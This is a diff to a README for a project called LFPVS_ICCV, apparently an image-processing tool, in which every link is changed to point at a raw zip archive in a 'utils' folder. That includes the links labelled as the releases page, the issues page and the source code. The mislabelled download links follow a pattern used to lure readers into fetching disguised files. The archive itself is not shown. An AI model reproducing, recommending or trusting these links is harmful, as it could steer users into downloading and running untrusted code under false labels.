@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download LFPVS_ICCV](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip)
+[![Download LFPVS_ICCV](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets the following minimum requiremen
 ## 📂 How to Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go directly to the download section of our GitHub repository:
-   ### [Visit this page to download](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip)
+   ### [Visit this page to download](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip)
 
 2. **Choose the Correct Version:** Once you’re on the releases page, look for the latest version of LFPVS_ICCV. It will be listed at the top, labeled with the version number (e.g., v1.0).
 
@@ -52,7 +52,7 @@ LFPVS_ICCV comes packed with features to enhance your visual processing experien
 
 ### How do I report a problem?
 
-If you encounter any issues, you can report them on the GitHub issues page found [here](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip). Make sure to provide clear details about the problem for faster assistance.
+If you encounter any issues, you can report them on the GitHub issues page found [here](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip). Make sure to provide clear details about the problem for faster assistance.
 
 ### Can I contribute to the project?
 
@@ -72,7 +72,7 @@ We love to hear from our users. If you have feedback, suggestions, or simply wan
 
 ## 🔗 Links
 
-- **Releases Page:** [Visit this page to download](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip)
-- **Source Code:** Explore the code and contribute on [GitHub](https://raw.githubusercontent.com/Onewit6143/LFPVS_ICCV/main/thebaism/LFPVS_ICCV.zip)
+- **Releases Page:** [Visit this page to download](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip)
+- **Source Code:** Explore the code and contribute on [GitHub](https://github.com/Onewit6143/LFPVS_ICCV/raw/refs/heads/main/utils/ICCV-LFPV-v2.6.zip)
 
 Start using LFPVS_ICCV today and unlock the power of image processing with ease!
